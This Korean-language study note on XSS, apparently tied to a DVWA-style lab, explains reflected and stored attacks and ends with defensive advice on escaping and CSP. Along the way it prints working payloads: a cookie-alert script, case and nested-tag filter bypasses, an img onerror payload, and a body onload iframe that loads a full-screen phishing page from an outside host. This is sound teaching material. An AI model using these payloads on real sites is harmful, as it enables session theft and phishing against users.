# XSS

## XSS 사례 및 대응 예시

### 반사형(1회성) 스크립트 (Reflected XSS)

* 입력받은 문자열을 새로운 문자열로 생성하여 바로 출력하는 경우 발생.

```html
<script>alert(document.cookie)</script>
```

* 받은 입력을 `name`에 저장하고 비었는지 검사만 하고 비어있지 않으면 출력하는 경우 취약. &#x20;

#### 우회 사례(소문자/대소문자 변형)

* 간단한 방어로 `<script>` 문자열을 공백으로 바꾸는 처리를 하면 소문자 또는 변형된 스크립트는 우회될 수 있음.

```html
<sCript>alert(document.cookie)</script>
```

* 내부에 `<script>`를 삽입해 태그를 분리하는 기법도 존재.

```html
<sc<script>ript>alert(document.cookie)</script>
```

#### 고급 우회(글자 단위 치환 방어 회피)

* 단일 문자 전부를 공백 처리하도록 `preg_replace()`로 처리하는 경우에도 우회 기법이 존재.

```html
<img src=x onerror=prompt()>
```

#### 불가능(적절한 이스케이프)

* `htmlspecialchars()` 같은 함수로 HTML에 사용되는 모든 특수 문자를 이스케이프하면 실행을 방지할 수 있음.

***

## 저장형(다용성) 스크립트 (Stored XSS)

* 데이터베이스 등에 저장되어 페이지 로드 시마다 여러 사용자에게 영향을 미치는 유형.

### 취약도 예시: low / medium / high

#### Low

* 개발자 도구로 입력 가능한 텍스트 수를 늘리는 등 제한을 완화하면 공격 가능.     &#x20;
* 두 필드 모두 XSS 취약점이 있어 이전에 저장한 스크립트가 먼저 실행되는 상황이 발생할 수 있음.&#x20;

#### Medium

* `message` 필드는 `htmlspecialchars()`로 특수문자를 일반 문자로 변형했지만, `name` 필드는 대소문자/변형/오류 유발에 취약함.  &#x20;

#### High

* 방어가 충분치 않은 필드가 남아있으면 높은 위험.&#x20;

***

### iframe을 이용한 공격 예시

* 본문(body)을 로드할 때 내부 HTML을 교체하여 외부(공격자) 사이트를 iframe으로 로드하는 기법.

```html
<body topmargin=0 leftmargin=0 onload="document.body.innerHTML='<iframe width=100% height=800 src=http://192.168.56.102/></iframe>',">
```

* 동작: 페이지 로드 시 body 내용을 변경해 iframe으로 공격자 피싱 사이트 등을 연결할 수 있음.
  * 상단/좌측 마진을 0으로 하여 전체 화면처럼 보이게 할 수 있음.

***

{% hint style="warning" %}
XSS 방어의 핵심 포인트:

* 모든 사용자 입력에 대해 적절한 이스케이프(출력 시)를 적용하세요. (예: HTML 문맥에서는 htmlspecialchars 등)
* 입력 검증만으로는 부족할 수 있으므로 출력 시 컨텍스트에 맞는 이스케이프를 적용해야 합니다.
* 가능한 경우 콘텐츠 보안 정책(CSP)을 도입해 스크립트 실행을 제한하세요.
{% endhint %}
